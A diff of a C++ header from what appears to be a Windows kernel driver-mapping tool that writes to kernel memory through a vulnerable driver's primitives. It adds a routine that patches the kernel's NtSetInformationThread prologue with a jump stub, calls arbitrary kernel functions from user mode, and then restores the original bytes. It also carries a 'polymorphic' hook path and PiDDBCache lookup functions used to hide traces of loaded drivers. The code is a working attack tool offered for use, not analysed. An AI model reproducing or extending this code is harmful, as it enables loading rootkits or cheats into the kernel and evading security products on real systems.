@@ -1,6 +1,9 @@
 ﻿#pragma once
 
 #include "Common.hpp"
+#include "Helper.hpp"
+#include "PEUtils.hpp"
+#include "X64Assembler.hpp"
 #include "Win.hpp"
 #include <ntstatus.h>
 
@@ -101,11 +104,11 @@ public:
 
 
 	/* Memory & resources management */
-	BOOL MemoryCopy(uint64_t destination, uint64_t source, uint64_t size);
-	BOOL SetMemory(uint64_t address, uint32_t value, uint64_t size);
-	BOOL GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address);
-	UINT64 MapIoSpace(uint64_t physical_address, uint32_t size);
-	BOOL UnmapIoSpace(uint64_t address, uint32_t size);
+	BOOL MemoryCopy(uint64_t destination, uint64_t source, uint64_t size) const;
+	BOOL SetMemory(uint64_t address, uint32_t value, uint64_t size) const;
+	BOOL GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address) const;
+	UINT64 MapIoSpace(uint64_t physical_address, uint32_t size) const;
+	BOOL UnmapIoSpace(uint64_t address, uint32_t size) const;
 	BOOL ReadMemory(uint64_t address, void* buffer, uint64_t size);
 	BOOL WriteMemory(uint64_t address, void* buffer, uint64_t size);
 	BOOL WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size);
@@ -128,12 +131,11 @@ public:
 	PVOID RtlLookupElementGenericTableAvl(PRTL_AVL_TABLE Table, PVOID Buffer);
 	PiDDBCacheEntry* LookupEntry(PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name);
 	PVOID RtlEnumerateGenericTableWithoutSplayingAvl(PRTL_AVL_TABLE Table, PVOID* RestartKey);
+
+
 	uintptr_t FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
 	uintptr_t FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size);
 	uintptr_t FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);
-
-
-	BOOL ClearMmUnloadedDrivers();
 
 
 	/* Helpers */
@@ -155,7 +157,9 @@ public:
 			constexpr bool is_void = std::is_same_v<T, void>;
 			static_assert(sizeof...(A) <= 4, "CallKernelFunction: max 4 arguments supported");
 
-			std::wcout << L"CallKernelFunction entry\n";
+			JumpLine();
+			LOG_INFO("***Calling kernel function***");
+			JumpLine();
 
 			if constexpr (!is_void)
 			{
@@ -214,27 +218,13 @@ public:
 
 			auto hook_vec = X64Assembler::PolymorphicHook(kernel_function_address, 12);
 
-		
-			std::wcout << L"[DEBUG] Hook generated, size: " << hook_vec.size() << L" bytes\n";
-			std::wcout << L"[DEBUG] Hook bytes: ";
-			for (size_t i = 0; i < hook_vec.size() && i < 20; i++) {
-				std::wcout << std::hex << static_cast<int>(hook_vec[i]) << L" ";
-			}
-			std::wcout << std::dec << L"\n";
-
-			const uint8_t shellcode_size = static_cast<uint8_t>(hook_vec.size());
-			std::wcout << L"[DEBUG] Shellcode size: " << static_cast<int>(shellcode_size) << L"\n";
-
-		
-
-
 			if (!WriteToReadOnlyMemory(kernel_NtAddAtom, (void*)hook_vec.data(), 12))
 			{
 				std::wcout << L"[ERROR] WriteToReadOnlyMemory(hook) failed\n";
 				return false;
 			} 
 
-			std::wcout << L"[DEBUG] Hook written successfully\n";
+			LOG_SUCCESS("Hook written successfully.");
 
 			// Make the call
 			using FunctionFn = T(__stdcall*)(A...);
@@ -268,4 +258,64 @@ public:
 			return restored;
 		}
 
+		template <typename T, typename... A>
+		bool CallKernelFunction1(uint64_t KernelBase, T* out_result, uint64_t kernel_function_address, A... arguments)
+		{
+			constexpr bool is_void = std::is_same_v<T, void>;
+			static_assert(sizeof...(A) <= 4, "CallKernelFunctionFixed: max 4 arguments");
+
+			std::wcout << L"*** CallKernelFunctionFixed (no polymorph) ***\n";
+
+			if constexpr (!is_void) { if (!out_result) { std::wcout << L"out_result null\n"; return false; } }
+			if (!kernel_function_address) { std::wcout << L"kernel_function_address null\n"; return false; }
+
+			HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+			if (!ntdll) { std::wcout << L"ntdll null\n"; return false; }
+
+			const auto SyscallUser = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtSetInformationThread"));
+			if (!SyscallUser) { std::wcout << L"NtSetInformationThread not found\n"; return false; }
+
+			const uint64_t SyscallKernel = GetKernelModuleExport(KernelBase, "NtSetInformationThread");
+			if (!SyscallKernel) { std::wcout << L"kernel NtSetInformationThread not found\n"; return false; }
+
+			uint8_t original[12] = {};
+			if (!ReadMemory(SyscallKernel, original, 12)) { std::wcout << L"ReadMemory original failed\n"; return false; }
+
+			std::wcout << L"Kernel prologue : ";
+			for (int i = 0; i < 12; ++i) std::wcout << std::hex << std::setw(2) << std::setfill(L'0') << original[i] << L' ';
+			std::wcout << L"\n";
+
+
+
+			uint8_t hook[12] = {
+				0x48, 0xB8,                                         // mov rax, imm64
+				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // addr (8 B)
+				0xFF, 0xE0                                          // jmp rax
+			};
+
+			// Copy function address
+			memcpy(hook + 2, &kernel_function_address, 8);
+
+			std::wcout << L"Hook bytes      : ";
+			for (int i = 0; i < 12; ++i) std::wcout << std::hex << std::setw(2) << hook[i] << L' ';
+			std::wcout << L"\n";
+
+			if (!WriteToReadOnlyMemory(SyscallKernel, hook, 12)) { std::wcout << L"Write hook failed\n"; return false; }
+
+			using FunctionFn = T(__stdcall*)(A...);
+			const auto fn = reinterpret_cast<FunctionFn>(SyscallUser);
+
+			if constexpr (is_void) {
+				fn(arguments...);
+				std::wcout << L"Void call done\n";
+			}
+			else {
+				*out_result = fn(arguments...);
+				std::wcout << L"Call returned 0x" << std::hex << *out_result << L"\n";
+			}
+
+			bool ok = WriteToReadOnlyMemory(SyscallKernel, original, 12);
+			std::wcout << (ok ? L"Restore OK\n" : L"Restore FAILED\n");
+			return ok;
+		}
 };
